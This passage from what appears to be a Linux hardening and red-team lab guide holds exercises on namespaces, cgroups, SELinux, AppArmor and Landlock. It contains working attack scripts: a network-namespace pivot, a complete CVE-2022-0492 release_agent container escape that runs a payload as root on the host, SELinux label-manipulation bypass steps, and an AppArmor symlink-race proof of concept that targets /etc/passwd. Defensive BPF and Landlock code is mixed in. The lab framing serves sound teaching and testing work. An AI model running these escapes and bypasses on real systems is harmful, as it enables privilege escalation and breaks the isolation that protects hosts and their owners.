        printf("[!] User namespaces may be disabled. Check:\n");
        printf("    cat /proc/sys/user/max_user_namespaces\n");
        printf("    cat /proc/sys/kernel/unprivileged_userns_clone\n");
        return 1;
    }

    /* Set up UID mapping: 0 inside → orig_uid outside */
    char buf[64];
    pid_t pid = getpid();

    char path[256];
    snprintf(path, sizeof(path), "/proc/%d/setgroups", pid);
    write_to(path, "deny");

    snprintf(path, sizeof(path), "/proc/%d/uid_map", pid);
    snprintf(buf, sizeof(buf), "0 %d 1", orig_uid);
    write_to(path, buf);

    snprintf(path, sizeof(path), "/proc/%d/gid_map", pid);
    snprintf(buf, sizeof(buf), "0 %d 1", orig_gid);
    write_to(path, buf);

    printf("[+] Now root inside user namespace:\n");
    printf("    uid=%d euid=%d\n", getuid(), geteuid());

    /* Show capabilities — should be full inside the namespace */
    FILE *f = fopen("/proc/self/status", "r");
    if (f) {
        char line[256];
        while (fgets(line, sizeof(line), f)) {
            if (strncmp(line, "Cap", 3) == 0)
                printf("    %s", line);
        }
        fclose(f);
    }

    printf("\n[*] With CAP_SYS_ADMIN inside namespace, attempting mount...\n");

    /* Make mount tree private */
    mount("", "/", NULL, MS_REC | MS_PRIVATE, NULL);

    /* Mount a tmpfs — demonstrates namespace-scoped CAP_SYS_ADMIN */
    mkdir("/tmp/userns_test", 0755);
    if (mount("tmpfs", "/tmp/userns_test", "tmpfs", 0, "size=1M") == 0) {
        printf("[+] Successfully mounted tmpfs — CAP_SYS_ADMIN active in namespace\n");

        /* Create a file inside */
        int fd = open("/tmp/userns_test/test_file", O_CREAT | O_WRONLY, 0644);
        if (fd >= 0) {
            write(fd, "namespace privilege test\n", 24);
            close(fd);
            printf("[+] Created file inside namespace-scoped mount\n");
        }

        /* This mount is NOT visible outside the namespace */
        printf("[*] This mount is invisible to processes outside this namespace\n");

        umount("/tmp/userns_test");
    } else {
        perror("mount tmpfs");
    }

    /* NOTE: CAP_SYS_ADMIN here does NOT grant host-level privileges.
       It's scoped to the user namespace. Cannot mount host devices,
       modify host cgroups, or perform host-level admin operations.
       The kernel checks ns_capable() which verifies capability
       ownership in the correct namespace. */

    printf("\n[*] Demonstrating limitation: cannot mount host block device\n");
    if (mount("/dev/sda1", "/tmp/userns_test", "ext4", MS_RDONLY, NULL) < 0) {
        printf("[+] mount /dev/sda1 failed: %s (expected — namespace-scoped)\n",
               strerror(errno));
    }

    rmdir("/tmp/userns_test");
    return 0;
}
```

**Build and test:**

```bash
gcc -o userns_escape userns_escape.c -Wall
# Run as unprivileged user
./userns_escape
```

**Expected output:** UID 0 inside namespace, full capabilities (scoped), successful tmpfs mount, failed host device mount.

#### Step 2.4 — Network Namespace Pivot Attack

Create `netns_pivot.c` — demonstrates entering host network namespace:

```c
#define _GNU_SOURCE
#include <fcntl.h>
#include <sched.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>

int main(void) {
    printf("=== Network Namespace Pivot ===\n\n");

    /* Show current network namespace */
    char self_ns[256], host_ns[256];
    ssize_t n1 = readlink("/proc/self/ns/net", self_ns, sizeof(self_ns) - 1);
    ssize_t n2 = readlink("/proc/1/ns/net", host_ns, sizeof(host_ns) - 1);

    if (n1 > 0 && n2 > 0) {
        self_ns[n1] = '\0';
        host_ns[n2] = '\0';
        printf("[*] Current net ns: %s\n", self_ns);
        printf("[*] Host net ns:    %s\n", host_ns);

        if (strcmp(self_ns, host_ns) == 0) {
            printf("[!] Already in host network namespace\n");
            return 0;
        }
    }

    /* Attempt to enter host network namespace */
    int fd = open("/proc/1/ns/net", O_RDONLY);
    if (fd < 0) {
        perror("[!] Cannot open /proc/1/ns/net");
        printf("    Need CAP_SYS_ADMIN or shared PID namespace\n");
        return 1;
    }

    if (setns(fd, CLONE_NEWNET) < 0) {
        perror("[!] setns failed");
        close(fd);
        return 1;
    }
    close(fd);

    printf("[+] Entered host network namespace!\n\n");

    /* Show host network interfaces */
    printf("[*] Host network interfaces:\n");
    system("ip addr show 2>/dev/null | head -40");

    printf("\n[*] Host routing table:\n");
    system("ip route show 2>/dev/null");

    printf("\n[*] Host listening sockets:\n");
    system("ss -tlnp 2>/dev/null | head -20");

    return 0;
}
```

---

### Exercise 3: Cgroup Exploitation — Resource Abuse and release_agent Escape

**Objective:** Demonstrate cgroup resource exhaustion attacks, the `release_agent` container escape (CVE-2022-0492), and cgroup-based device access bypass.

#### Step 3.1 — Cgroup Resource Exhaustion (Fork Bomb in Cgroup)

Create `cgroup_dos.sh`:

```bash
#!/bin/bash
# cgroup_dos.sh — Demonstrate cgroup resource limits and DoS vectors
# Run in a test environment only!

echo "=== Cgroup Resource Exhaustion Demo ==="

# Create a test cgroup (cgroups v2)
CGROUP_PATH="/sys/fs/cgroup/lab_test"

if [ ! -d "$CGROUP_PATH" ]; then
    sudo mkdir -p "$CGROUP_PATH"
    # Enable controllers
    echo "+memory +pids +cpu" | sudo tee /sys/fs/cgroup/cgroup.subtree_control >/dev/null 2>&1
fi

# Set limits
echo "Setting resource limits..."
echo "50M" | sudo tee "$CGROUP_PATH/memory.max" >/dev/null    # 50MB memory limit
echo "10"  | sudo tee "$CGROUP_PATH/pids.max" >/dev/null       # Max 10 processes
echo "50000 100000" | sudo tee "$CGROUP_PATH/cpu.max" >/dev/null  # 50% CPU

echo ""
echo "--- Limits set ---"
echo "  memory.max: $(cat $CGROUP_PATH/memory.max)"
echo "  pids.max:   $(cat $CGROUP_PATH/pids.max)"
echo "  cpu.max:    $(cat $CGROUP_PATH/cpu.max)"

# Move self into the cgroup
echo $$ | sudo tee "$CGROUP_PATH/cgroup.procs" >/dev/null

echo ""
echo "--- Test 1: Fork bomb (pids.max should stop it) ---"
(
    # Attempt fork bomb — pids.max = 10 should limit it
    for i in $(seq 1 20); do
        sleep 100 &
        echo "  Fork attempt $i: PID $! ($(cat $CGROUP_PATH/pids.current)/$(cat $CGROUP_PATH/pids.max))"
    done 2>&1 | head -15
    # Kill background jobs
    kill $(jobs -p) 2>/dev/null
    wait 2>/dev/null
)

echo ""
echo "--- Test 2: Memory exhaustion (memory.max should OOM) ---"
python3 -c "
import sys
chunks = []
try:
    for i in range(100):
        chunks.append(b'A' * (1024 * 1024))  # 1MB chunks
        print(f'  Allocated {(i+1)}MB', flush=True)
except MemoryError:
    print(f'  OOM at {len(chunks)}MB — cgroup limit enforced')
" 2>&1 || echo "  Process killed by OOM killer"

echo ""
echo "--- Memory stats after test ---"
echo "  memory.current: $(cat $CGROUP_PATH/memory.current 2>/dev/null)"
echo "  memory.events:  $(cat $CGROUP_PATH/memory.events 2>/dev/null)"
echo "  pids.current:   $(cat $CGROUP_PATH/pids.current 2>/dev/null)"

# Cleanup
sudo rmdir "$CGROUP_PATH" 2>/dev/null
echo ""
echo "[+] Cgroup DoS demo complete"
```

#### Step 3.2 — release_agent Container Escape (CVE-2022-0492)

Create `release_agent_escape.sh`:

```bash
#!/bin/bash
# release_agent_escape.sh — CVE-2022-0492 container escape via cgroup v1
#
# PREREQUISITES:
#   - Running inside a container with CAP_SYS_ADMIN
#   - Cgroups v1 available (not all modern systems)
#   - Educational/authorized testing only
#
# Start test container:
#   docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined \
#       ubuntu:22.04 bash

echo "=== CVE-2022-0492: release_agent Container Escape ==="

# Step 1: Check prerequisites
echo ""
echo "--- Checking prerequisites ---"
CAPEFF=$(grep CapEff /proc/self/status | awk '{print $2}')
echo "  CapEff: $CAPEFF"
if echo "$CAPEFF" | grep -q "000001ffffffffff"; then
    echo "  [ok] All capabilities present (privileged)"
elif python3 -c "print('SYS_ADMIN' if int('$CAPEFF', 16) & (1 << 21) else 'NO')" 2>/dev/null | grep -q SYS_ADMIN; then
    echo "  [ok] CAP_SYS_ADMIN present"
else
    echo "  [!] CAP_SYS_ADMIN NOT present — escape will fail"
    exit 1
fi

# Step 2: Mount a cgroup v1 hierarchy
echo ""
echo "--- Mounting cgroup v1 hierarchy ---"
CGROUP_MNT="/tmp/cgrp_escape"
mkdir -p "$CGROUP_MNT"

# Try different controllers (rdma is often available and unclaimed)
MOUNTED=0
for controller in rdma memory cpu devices; do
    if mount -t cgroup -o "$controller" cgroup "$CGROUP_MNT" 2>/dev/null; then
        echo "  [+] Mounted cgroup v1 with controller: $controller"
        MOUNTED=1
        break
    fi
done

if [ "$MOUNTED" -eq 0 ]; then
    echo "  [!] Cannot mount any cgroup v1 hierarchy"
    echo "      System may be cgroups v2 only or mount is blocked"
    rmdir "$CGROUP_MNT"
    exit 1
fi

# Step 3: Create child cgroup
echo ""
echo "--- Creating child cgroup for escape ---"
CHILD_CGRP="$CGROUP_MNT/x"
mkdir "$CHILD_CGRP"

# Step 4: Find the container's overlay path on the host
echo ""
echo "--- Determining host-side path ---"
HOST_PATH=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab 2>/dev/null | head -1)
if [ -z "$HOST_PATH" ]; then
    # Alternative: check /proc/self/mountinfo for upper dir
    HOST_PATH=$(grep "upperdir=" /proc/self/mountinfo 2>/dev/null | sed 's/.*upperdir=\([^,]*\).*/\1/' | head -1)
fi
echo "  Host overlay path: ${HOST_PATH:-(could not determine)}"

if [ -z "$HOST_PATH" ]; then
    echo "  [!] Cannot determine host path — using /tmp as fallback"
    echo "      (escape payload will only work if /tmp is shared)"
    HOST_PATH="/tmp"
fi

# Step 5: Write escape payload
PAYLOAD_NAME="escape_payload.sh"
cat > "/$PAYLOAD_NAME" << 'ESCAPE_PAYLOAD'
#!/bin/bash
# This script executes as root on the HOST when release_agent fires
# Proof of concept — writes host info to a file accessible from container
cat /etc/hostname > /tmp/.escape_proof 2>/dev/null
id >> /tmp/.escape_proof 2>/dev/null
date >> /tmp/.escape_proof 2>/dev/null
echo "Container escape successful" >> /tmp/.escape_proof 2>/dev/null
ESCAPE_PAYLOAD
chmod +x "/$PAYLOAD_NAME"

# Step 6: Set release_agent
echo ""
echo "--- Configuring release_agent ---"
echo "$HOST_PATH/$PAYLOAD_NAME" > "$CGROUP_MNT/release_agent" 2>/dev/null
RESULT=$?
if [ $RESULT -ne 0 ]; then
    echo "  [!] Cannot write release_agent — kernel may be patched (post-fix)"
    echo "      CVE-2022-0492 fix requires init user ns CAP_SYS_ADMIN"
    umount "$CGROUP_MNT" 2>/dev/null
    rmdir "$CHILD_CGRP" "$CGROUP_MNT" 2>/dev/null
    exit 1
fi
echo "  release_agent set to: $(cat $CGROUP_MNT/release_agent)"

# Step 7: Enable notify_on_release
echo 1 > "$CHILD_CGRP/notify_on_release"
echo "  notify_on_release: $(cat $CHILD_CGRP/notify_on_release)"

# Step 8: Trigger — put process in child cgroup and let it exit
echo ""
echo "--- Triggering release_agent ---"
sh -c "echo \$\$ > $CHILD_CGRP/cgroup.procs && exit" 2>/dev/null

# Step 9: Wait and check
sleep 2
echo ""
echo "--- Checking for escape proof ---"
if [ -f /tmp/.escape_proof ]; then
    echo "  [+] ESCAPE SUCCESSFUL:"
    cat /tmp/.escape_proof | sed 's/^/      /'
    rm -f /tmp/.escape_proof
else
    echo "  [-] Escape payload did not execute (kernel may be patched)"
fi

# Cleanup
umount "$CGROUP_MNT" 2>/dev/null
rmdir "$CHILD_CGRP" "$CGROUP_MNT" 2>/dev/null
rm -f "/$PAYLOAD_NAME"
```

**Test with a vulnerable container:**

```bash
# On host — start container with CAP_SYS_ADMIN (simulating misconfiguration):
docker run --rm -it \
    --cap-add=SYS_ADMIN \
    --security-opt apparmor=unconfined \
    --security-opt seccomp=unconfined \
    ubuntu:22.04 bash

# Inside container — run the escape script
# (copy or download release_agent_escape.sh first)
bash release_agent_escape.sh
```

#### Step 3.3 — BPF Cgroup Device Filter

Create `cgroup_bpf_device.c` — eBPF program restricting device access per cgroup:

```c
/* cgroup_bpf_device.c — Attach BPF device filter to a cgroup
 * Demonstrates BPF_CGROUP_DEVICE usage for fine-grained device control.
 * Requires: root, kernel 4.15+, CONFIG_CGROUP_BPF
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/syscall.h>
#include <linux/bpf.h>

/* Minimal BPF program: deny all device access except /dev/null and /dev/zero */
/* BPF_CGROUP_DEVICE receives: access_type, major, minor */
static struct bpf_insn device_filter[] = {
    /* r2 = *(u32 *)(r1 + 4)  — major number */
    BPF_LDX_MEM(BPF_W, BPF_REG_2, BPF_REG_1, 4),
    /* r3 = *(u32 *)(r1 + 8)  — minor number */
    BPF_LDX_MEM(BPF_W, BPF_REG_3, BPF_REG_1, 8),

    /* Allow /dev/null (1, 3) */
    BPF_JMP_IMM(BPF_JNE, BPF_REG_2, 1, 2),   /* major != 1 → skip */
    BPF_JMP_IMM(BPF_JNE, BPF_REG_3, 3, 1),   /* minor != 3 → skip */
    BPF_MOV64_IMM(BPF_REG_0, 1),              /* return ALLOW */
    BPF_EXIT_INSN(),

    /* Allow /dev/zero (1, 5) */
    BPF_JMP_IMM(BPF_JNE, BPF_REG_2, 1, 2),
    BPF_JMP_IMM(BPF_JNE, BPF_REG_3, 5, 1),
    BPF_MOV64_IMM(BPF_REG_0, 1),
    BPF_EXIT_INSN(),

    /* Allow /dev/tty (5, 0) */
    BPF_JMP_IMM(BPF_JNE, BPF_REG_2, 5, 2),
    BPF_JMP_IMM(BPF_JNE, BPF_REG_3, 0, 1),
    BPF_MOV64_IMM(BPF_REG_0, 1),
    BPF_EXIT_INSN(),

    /* Deny everything else */
    BPF_MOV64_IMM(BPF_REG_0, 0),
    BPF_EXIT_INSN(),
};

static int bpf(int cmd, union bpf_attr *attr, unsigned int size) {
    return syscall(__NR_bpf, cmd, attr, size);
}

int main(int argc, char *argv[]) {
    if (argc < 2) {
        fprintf(stderr, "Usage: %s <cgroup_path>\n", argv[0]);
        fprintf(stderr, "  e.g.: %s /sys/fs/cgroup/test_cgroup\n", argv[0]);
        return 1;
    }

    printf("[*] Loading BPF device filter for cgroup: %s\n", argv[1]);

    /* Load BPF program */
    char log_buf[4096] = {};
    union bpf_attr attr = {
        .prog_type = BPF_PROG_TYPE_CGROUP_DEVICE,
        .insns = (unsigned long long)device_filter,
        .insn_cnt = sizeof(device_filter) / sizeof(device_filter[0]),
        .license = (unsigned long long)"GPL",
        .log_buf = (unsigned long long)log_buf,
        .log_size = sizeof(log_buf),
        .log_level = 1,
    };

    int prog_fd = bpf(BPF_PROG_LOAD, &attr, sizeof(attr));
    if (prog_fd < 0) {
        fprintf(stderr, "[!] BPF_PROG_LOAD failed: %s\n", strerror(errno));
        if (log_buf[0]) fprintf(stderr, "    Verifier: %s\n", log_buf);
        return 1;
    }
    printf("[+] BPF program loaded (fd=%d)\n", prog_fd);

    /* Attach to cgroup */
    int cgroup_fd = open(argv[1], O_RDONLY);
    if (cgroup_fd < 0) {
        perror("open cgroup");
        close(prog_fd);
        return 1;
    }

    memset(&attr, 0, sizeof(attr));
    attr.attach_bpf_fd = prog_fd;
    attr.target_fd = cgroup_fd;
    attr.attach_type = BPF_CGROUP_DEVICE;

    if (bpf(BPF_PROG_ATTACH, &attr, sizeof(attr)) < 0) {
        fprintf(stderr, "[!] BPF_PROG_ATTACH failed: %s\n", strerror(errno));
        close(prog_fd);
        close(cgroup_fd);
        return 1;
    }

    printf("[+] BPF device filter attached to cgroup\n");
    printf("    Allowed devices: /dev/null, /dev/zero, /dev/tty\n");
    printf("    All other device access DENIED\n");

    close(prog_fd);
    close(cgroup_fd);
    return 0;
}
```

---

### Exercise 4: SELinux Policy Exploitation and Bypass

**Objective:** Enumerate SELinux policy for attack surface, exploit permissive domains, abuse boolean misconfigurations, and demonstrate label manipulation.

#### Step 4.1 — SELinux Reconnaissance Script

Create `selinux_recon.sh` (run on a Fedora/RHEL system with SELinux enforcing):

```bash
#!/bin/bash
# selinux_recon.sh — SELinux policy reconnaissance for red team

echo "=========================================="
echo "   SELinux Reconnaissance"
echo "=========================================="

echo ""
echo "--- 1. SELinux Mode ---"
GETENFORCE=$(getenforce 2>/dev/null)
echo "  Mode: $GETENFORCE"
if [ "$GETENFORCE" = "Permissive" ]; then
    echo "  [!!] PERMISSIVE — SELinux logging but NOT enforcing"
elif [ "$GETENFORCE" = "Disabled" ]; then
    echo "  [!!] DISABLED — No MAC protection"
fi

echo ""
echo "--- 2. Current Domain ---"
DOMAIN=$(cat /proc/self/attr/current 2>/dev/null)
echo "  Current context: $DOMAIN"

echo ""
echo "--- 3. Permissive Domains (containment gaps) ---"
semanage permissive -l 2>/dev/null | grep -v "^$" | sed 's/^/  /'
if [ $? -ne 0 ]; then
    echo "  (semanage not available or insufficient privileges)"
fi

echo ""
echo "--- 4. Unconfined Processes (no SELinux restriction) ---"
ps -eZ 2>/dev/null | grep unconfined_t | grep -v "grep\|kernel" | head -15 | \
    awk '{printf "  PID %-8s Domain: %-40s Cmd: %s\n", $2, $1, $NF}'
UNCONFINED_COUNT=$(ps -eZ 2>/dev/null | grep -c unconfined_t)
echo "  Total unconfined processes: $UNCONFINED_COUNT"

echo ""
echo "--- 5. Dangerous Booleans (enabled) ---"
DANGEROUS_BOOLS=(
    "httpd_can_network_connect"
    "httpd_execmem"
    "httpd_can_connect_ftp"
    "httpd_enable_cgi"
    "container_manage_cgroup"
    "domain_can_mmap_files"
    "allow_execmem"
    "allow_execstack"
    "virt_use_execmem"
    "selinuxuser_execmod"
)
for bool in "${DANGEROUS_BOOLS[@]}"; do
    val=$(getsebool "$bool" 2>/dev/null | awk -F'--> ' '{print $2}')
    if [ "$val" = "on" ]; then
        echo "  [!] $bool = on"
    fi
done

echo ""
echo "--- 6. File Context Anomalies ---"
echo "  Checking for mislabeled files in /etc..."
restorecon -Rnv /etc 2>/dev/null | head -10 | sed 's/^/  /'

echo ""
echo "--- 7. Domain Transitions from Current Domain ---"
if command -v sesearch &>/dev/null; then
    echo "  Type transitions reachable from $DOMAIN:"
    sesearch -T -s "${DOMAIN%%:*}" 2>/dev/null | head -10 | sed 's/^/  /'
fi

echo ""
echo "--- 8. What Can Current Domain Access? ---"
if command -v sesearch &>/dev/null; then
    DOMAIN_TYPE=$(echo "$DOMAIN" | cut -d: -f3)
    echo "  Allow rules for $DOMAIN_TYPE (file class):"
    sesearch -A -s "$DOMAIN_TYPE" -c file 2>/dev/null | head -15 | sed 's/^/  /'
fi

echo ""
echo "--- 9. Policy Statistics ---"
if command -v seinfo &>/dev/null; then
    echo "  Types:      $(seinfo -t 2>/dev/null | tail -1)"
    echo "  Roles:      $(seinfo -r 2>/dev/null | tail -1)"
    echo "  Booleans:   $(seinfo -b 2>/dev/null | tail -1)"
fi
```

#### Step 4.2 — SELinux Label Manipulation Attack

Create `selinux_label_attack.sh`:

```bash
#!/bin/bash
# selinux_label_attack.sh — Demonstrate SELinux label manipulation
# Requires: CAP_MAC_ADMIN or root with permissive domain

echo "=== SELinux Label Manipulation Attack ==="

# Attack scenario: change a sensitive file's label so our domain can read it
# Normally, httpd_t cannot read shadow_t files
# If we can change the label, we bypass type enforcement

echo ""
echo "--- Current labels on sensitive files ---"
ls -Z /etc/shadow /etc/passwd 2>/dev/null | sed 's/^/  /'

echo ""
echo "--- Step 1: Create test file with correct label ---"
echo "sensitive data" > /tmp/selinux_test
chcon system_u:object_r:shadow_t:s0 /tmp/selinux_test 2>/dev/null
ls -Z /tmp/selinux_test | sed 's/^/  /'

echo ""
echo "--- Step 2: Attempt to read with httpd_t context (should fail) ---"
# runcon changes the security context for the command
runcon system_u:system_r:httpd_t:s0 cat /tmp/selinux_test 2>&1 | sed 's/^/  /'

echo ""
echo "--- Step 3: Relabel to httpd_content_t (bypass) ---"
chcon system_u:object_r:httpd_content_t:s0 /tmp/selinux_test 2>/dev/null
ls -Z /tmp/selinux_test | sed 's/^/  /'

echo ""
echo "--- Step 4: Read with httpd_t context (should succeed) ---"
runcon system_u:system_r:httpd_t:s0 cat /tmp/selinux_test 2>&1 | sed 's/^/  /'

echo ""
echo "[*] Attack: if an attacker gains CAP_MAC_ADMIN, they can chcon"
echo "    any file to a type their domain can access, bypassing TE."
echo ""
echo "[*] Defense: drop CAP_MAC_ADMIN from all non-admin processes."
echo "    Monitor 'chcon' and 'restorecon' via auditd."

rm -f /tmp/selinux_test
```

---

### Exercise 5: AppArmor Profile Bypass and Symlink Race

**Objective:** Analyze AppArmor profiles, find path-based bypass vectors, and exploit symlink race conditions against path-based MAC.

#### Step 5.1 — AppArmor Profile Analysis

Create `aa_analysis.sh`:

```bash
#!/bin/bash
# aa_analysis.sh — Analyze AppArmor profiles for weaknesses

echo "=========================================="
echo "   AppArmor Profile Analysis"
echo "=========================================="

echo ""
echo "--- 1. AppArmor Status ---"
aa-status 2>/dev/null | head -20 | sed 's/^/  /'

echo ""
echo "--- 2. Current Process Confinement ---"
echo "  Profile: $(cat /proc/self/attr/current 2>/dev/null)"

echo ""
echo "--- 3. Profiles in Complain Mode (log-only, no enforcement) ---"
aa-status 2>/dev/null | grep -A 100 "complain mode" | grep "^   " | sed 's/^/  [!] /'

echo ""
echo "--- 4. Unconfined Processes with Network Listeners ---"
aa-unconfined 2>/dev/null | head -20 | sed 's/^/  /'

echo ""
echo "--- 5. Profile Weaknesses ---"
echo "  Checking for overly broad rules in /etc/apparmor.d/..."
for profile in /etc/apparmor.d/*; do
    [ -f "$profile" ] || continue
    name=$(basename "$profile")

    # Check for wildcard paths
    if grep -q '/\*\*' "$profile" 2>/dev/null; then
        echo "  [!] $name: Contains /** (recursive wildcard)"
    fi

    # Check for unconfined execution
    if grep -q 'ux' "$profile" 2>/dev/null; then
        echo "  [!] $name: Contains 'ux' (unconfined execute)"
    fi

    # Check for missing deny rules on sensitive paths
    if ! grep -q 'deny.*/etc/shadow' "$profile" 2>/dev/null; then
        # Only flag if the profile grants file access
        if grep -q '/etc/' "$profile" 2>/dev/null; then
            echo "  [?] $name: No explicit deny on /etc/shadow"
        fi
    fi

    # Check for capability grants
    caps=$(grep "capability " "$profile" 2>/dev/null | grep -oP 'capability \K\w+')
    if echo "$caps" | grep -qE "sys_admin|sys_ptrace|sys_module|mac_override"; then
        echo "  [!] $name: Grants dangerous capability: $caps"
    fi
done
```

#### Step 5.2 — AppArmor Symlink Race PoC

Create `aa_symlink_race.sh`:

```bash
#!/bin/bash
# aa_symlink_race.sh — Demonstrate AppArmor path-based bypass via symlink race
#
# AppArmor confines access by path. If we can replace a directory with a
# symlink between the path resolution and the actual file open, the process
# may access files outside its allowed paths.
#
# NOTE: fs.protected_symlinks=1 mitigates this in sticky directories.
# This PoC uses a non-sticky directory to demonstrate the concept.

echo "=== AppArmor Symlink Race PoC ==="

# Step 1: Create a test AppArmor profile
PROFILE_NAME="aa_race_target"
PROFILE_FILE="/etc/apparmor.d/${PROFILE_NAME}"

echo ""
echo "--- Setting up test AppArmor profile ---"
sudo tee "$PROFILE_FILE" > /dev/null << 'PROFILE'
#include <tunables/global>

/tmp/aa_race_target {
    #include <abstractions/base>
    /tmp/aa_race_data/** rw,
    deny /etc/shadow r,
    deny /etc/passwd r,
}
PROFILE

sudo apparmor_parser -r "$PROFILE_FILE" 2>/dev/null
echo "  Profile loaded: $PROFILE_NAME"

# Step 2: Create the target binary that repeatedly opens a file
cat > /tmp/aa_race_target.c << 'CODE'
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>

int main(void) {
    char buf[256];
    for (int i = 0; i < 1000; i++) {
        int fd = open("/tmp/aa_race_data/target.txt", O_RDONLY);
        if (fd >= 0) {
            ssize_t n = read(fd, buf, sizeof(buf) - 1);
            if (n > 0) {
                buf[n] = '\0';
                /* Check if we read something we shouldn't */
                if (strstr(buf, "root:") != NULL) {
                    printf("[!] READ OUTSIDE PROFILE (iteration %d): %s\n", i, buf);
                }
            }
            close(fd);
        }
        usleep(100);  /* Small delay to give racer a window */
    }
    return 0;
}
CODE
gcc -o /tmp/aa_race_target /tmp/aa_race_target.c -Wall
echo "  Target binary compiled"

# Step 3: Create legitimate data
mkdir -p /tmp/aa_race_data
echo "legitimate data" > /tmp/aa_race_data/target.txt

# Step 4: Run the racer in background
echo ""
echo "--- Running symlink race ---"
echo "  Racer: alternating /tmp/aa_race_data between dir and symlink"
(
    for i in $(seq 1 500); do
        # Legitimate directory
        rm -rf /tmp/aa_race_data 2>/dev/null
        mkdir -p /tmp/aa_race_data
        echo "legitimate data" > /tmp/aa_race_data/target.txt
        # Replace with symlink to /etc (symlink target.txt → /etc/passwd)
        rm -rf /tmp/aa_race_data 2>/dev/null
        mkdir -p /tmp/aa_race_data
        ln -sf /etc/passwd /tmp/aa_race_data/target.txt 2>/dev/null
    done
) &
RACER_PID=$!

# Step 5: Run the confined target
/tmp/aa_race_target 2>&1

kill $RACER_PID 2>/dev/null
wait $RACER_PID 2>/dev/null

echo ""
echo "--- Checking AppArmor logs for denials ---"
dmesg | grep apparmor | grep DENIED | tail -5 | sed 's/^/  /'

# Step 6: Check fs.protected_symlinks
echo ""
echo "--- Mitigation check ---"
PROT=$(sysctl -n fs.protected_symlinks 2>/dev/null)
echo "  fs.protected_symlinks = $PROT"
if [ "$PROT" = "1" ]; then
    echo "  [ok] Symlink protection enabled — race mitigated in sticky dirs"
else
    echo "  [!] Symlink protection DISABLED — vulnerable"
fi

# Cleanup
sudo apparmor_parser -R "$PROFILE_FILE" 2>/dev/null
sudo rm -f "$PROFILE_FILE"
rm -rf /tmp/aa_race_data /tmp/aa_race_target /tmp/aa_race_target.c
```

---

### Exercise 6: Landlock Unprivileged Sandboxing

**Objective:** Build a self-sandboxing application using Landlock for filesystem and network access control, test ABI version negotiation, and verify stacking with other LSMs.

#### Step 6.1 — Landlock Sandbox Application

Create `landlock_sandbox.c`:

```c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/prctl.h>
#include <sys/syscall.h>
#include <linux/landlock.h>

#ifndef landlock_create_ruleset
static inline int landlock_create_ruleset(
    const struct landlock_ruleset_attr *attr, size_t size, __u32 flags) {
    return syscall(__NR_landlock_create_ruleset, attr, size, flags);
}
#endif

#ifndef landlock_add_rule
static inline int landlock_add_rule(int ruleset_fd,
    enum landlock_rule_type type, const void *attr, __u32 flags) {
    return syscall(__NR_landlock_add_rule, ruleset_fd, type, attr, flags);
}
#endif

#ifndef landlock_restrict_self
static inline int landlock_restrict_self(int ruleset_fd, __u32 flags) {
    return syscall(__NR_landlock_restrict_self, ruleset_fd, flags);
}
#endif

static int add_path_rule(int rs_fd, const char *path, __u64 access) {
    int fd = open(path, O_PATH | O_CLOEXEC);
    if (fd < 0) {
        fprintf(stderr, "  [!] Cannot open path '%s': %s\n", path, strerror(errno));
        return -1;
    }
    struct landlock_path_beneath_attr attr = {
        .allowed_access = access,
        .parent_fd = fd,
    };
    int ret = landlock_add_rule(rs_fd, LANDLOCK_RULE_PATH_BENEATH, &attr, 0);
    close(fd);
    if (ret < 0) {
        fprintf(stderr, "  [!] add_rule for '%s': %s\n", path, strerror(errno));
    } else {
        printf("  [+] Rule: %s → access=0x%llx\n", path, (unsigned long long)access);
    }
    return ret;
}

int main(int argc, char *argv[]) {
    printf("=== Landlock Sandbox Demo ===\n\n");

    /* Step 1: Check Landlock ABI version */
    int abi = landlock_create_ruleset(NULL, 0, LANDLOCK_CREATE_RULESET_VERSION);
    if (abi < 0) {
        if (errno == ENOSYS) {
            fprintf(stderr, "[!] Landlock not supported by this kernel\n");
        } else if (errno == EOPNOTSUPP) {
            fprintf(stderr, "[!] Landlock disabled. Enable via boot param: lsm=...,landlock\n");
        } else {
            perror("landlock_create_ruleset(VERSION)");
        }
        return 1;
    }
    printf("[*] Landlock ABI version: %d\n", abi);

    /* Step 2: Create ruleset */
    __u64 fs_access =
        LANDLOCK_ACCESS_FS_READ_FILE |
        LANDLOCK_ACCESS_FS_READ_DIR |
        LANDLOCK_ACCESS_FS_WRITE_FILE |
        LANDLOCK_ACCESS_FS_EXECUTE;

    /* Add truncate if ABI >= 3 */
    if (abi >= 3)
        fs_access |= LANDLOCK_ACCESS_FS_TRUNCATE;

    struct landlock_ruleset_attr rs_attr = {
        .handled_access_fs = fs_access,
    };

    /* Add network if ABI >= 4 */
    if (abi >= 4) {
        rs_attr.handled_access_net =
            LANDLOCK_ACCESS_NET_BIND_TCP |
            LANDLOCK_ACCESS_NET_CONNECT_TCP;
    }

    int rs_fd = landlock_create_ruleset(&rs_attr, sizeof(rs_attr), 0);
    if (rs_fd < 0) {
        perror("landlock_create_ruleset");
        return 1;
    }
    printf("[+] Ruleset created (fd=%d)\n\n", rs_fd);

    /* Step 3: Add filesystem rules */
    printf("--- Adding filesystem rules ---\n");

    /* Read-only access to system paths */
    add_path_rule(rs_fd, "/usr",
        LANDLOCK_ACCESS_FS_READ_FILE |
        LANDLOCK_ACCESS_FS_READ_DIR |
        LANDLOCK_ACCESS_FS_EXECUTE);

    add_path_rule(rs_fd, "/lib",
        LANDLOCK_ACCESS_FS_READ_FILE |
        LANDLOCK_ACCESS_FS_READ_DIR |
        LANDLOCK_ACCESS_FS_EXECUTE);

    add_path_rule(rs_fd, "/etc",
        LANDLOCK_ACCESS_FS_READ_FILE |
        LANDLOCK_ACCESS_FS_READ_DIR);

    add_path_rule(rs_fd, "/proc",
        LANDLOCK_ACCESS_FS_READ_FILE |
        LANDLOCK_ACCESS_FS_READ_DIR);

    /* Read-write access to /tmp */
    add_path_rule(rs_fd, "/tmp",
        LANDLOCK_ACCESS_FS_READ_FILE |
        LANDLOCK_ACCESS_FS_READ_DIR |
        LANDLOCK_ACCESS_FS_WRITE_FILE);

    /* Add network rules if supported */
    if (abi >= 4) {
        printf("\n--- Adding network rules ---\n");
